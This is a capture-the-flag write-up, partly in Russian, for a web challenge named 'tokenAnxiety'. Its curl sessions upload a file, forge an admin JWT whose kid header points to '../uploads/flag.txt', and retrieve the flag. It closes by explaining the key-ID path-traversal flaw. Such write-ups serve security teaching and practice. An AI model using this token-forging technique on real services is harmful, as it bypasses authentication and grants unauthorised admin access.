1. view my guest token:
```
┌──(amir㉿kali)-[~/Downloads/aitu_ctf/web/tokenAnxiety]
└─$ curl -X POST http://token-anxiety.ctf.fr13nds.team/login \
     -H "Content-Type: application/json" \
     -d '{"username": "guest", "password": "guest"}' -i
HTTP/1.1 200 OK
Date: Mon, 23 Mar 2026 11:17:25 GMT
Content-Type: application/json
Content-Length: 136
Connection: keep-alive
Server: cloudflare
Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
cf-cache-status: DYNAMIC
Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=TycJYbW7j%2Fq1JPP7H3Lq5FP5bVUlyqBno9NhRSEGA75jpcmUQ1K3MIoMdRJpCWY1km5GD%2FHH8s5Ti9klhd7%2F0YQXXZt4JzlsAXtyrQzddLzjOBOVNeQwabm9TbcZyw%3D%3D"}]}
CF-RAY: 9e0d07908b1eecef-ALA
alt-svc: h3=":443"; ma=86400

{"token":"eyJhbGciOiJIUzI1NiIsImtpZCI6Imd1ZXN0In0.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.nBTthMG1uDN1dsih5KSauGVKWIywmpz0ZaTHogDr63w"}
```

2. make fake flag txt

3. upload it on server
```
┌──(amir㉿kali)-[~/Downloads/aitu_ctf/web/tokenAnxiety]
└─$ curl -X POST http://token-anxiety.ctf.fr13nds.team/upload \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Imd1ZXN0In0.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.nBTthMG1uDN1dsih5KSauGVKWIywmpz0ZaTHogDr63w" \
     -F "file=@flag.txt" -i
HTTP/1.1 200 OK
Date: Mon, 23 Mar 2026 11:20:04 GMT
Content-Type: application/json
Content-Length: 58
Connection: keep-alive
Server: cloudflare
Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
cf-cache-status: DYNAMIC
Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=5oCier3S1P91xxk3W6AqZ5RWY%2FLjGjqOqAY7MsLZe1W3ms4g1RafJkfcUoFplm71vnoONeNRx6yFT4%2Bdpd3aYWUZxJmIeh4Qtdk3%2FBvhZPBohzkIZUaan%2BIT8DSdfg%3D%3D"}]}
CF-RAY: 9e0d0b707a54eceb-ALA
alt-svc: h3=":443"; ma=86400

{"filename":"flag.txt","message":"uploaded successfully"}
```

4. generate new admin token 
```
python3 newtoken.py
```

5. take flag
```
┌──(amir㉿kali)-[~/Downloads/aitu_ctf/web/tokenAnxiety]
└─$ curl -X GET http://token-anxiety.ctf.fr13nds.team/flag \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL3VwbG9hZHMvZmxhZy50eHQifQ.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9._RFlIRedjonJuzW0aTu3rx0950qNZPS7FIAXmytiHr4" -i
HTTP/1.1 200 OK
Date: Mon, 23 Mar 2026 11:21:02 GMT
Content-Type: application/json
Content-Length: 42
Connection: keep-alive
Server: cloudflare
Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
cf-cache-status: DYNAMIC
Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=pv94c6uxeWUV7sDL5AeRELw4XEy69wFIiR9UyfoSKfD%2F21qtjEmdc1C0P7G25%2FrEtgop6OIqpbkdE7WmIOYPakbKleK8MgSHQZAXy3k1g1ptN3lz6Q2QCXNa1TY%3D"}]}
CF-RAY: 9e0d0cdbdd16543a-TLL
alt-svc: h3=":443"; ma=86400

{"flag":"f13{p4th_tr4v3rs4l_g03s_brrrr}"}
```

6. Мы используем уязвимость KID (Key ID) Confusion. Сервер доверяет тому, что написано в kid, и идет читать файл по указанному пути. Раз мы сами загрузили этот файл, мы знаем "секрет" (слово hit) и можем подписать любой payload (например, с ролью admin).


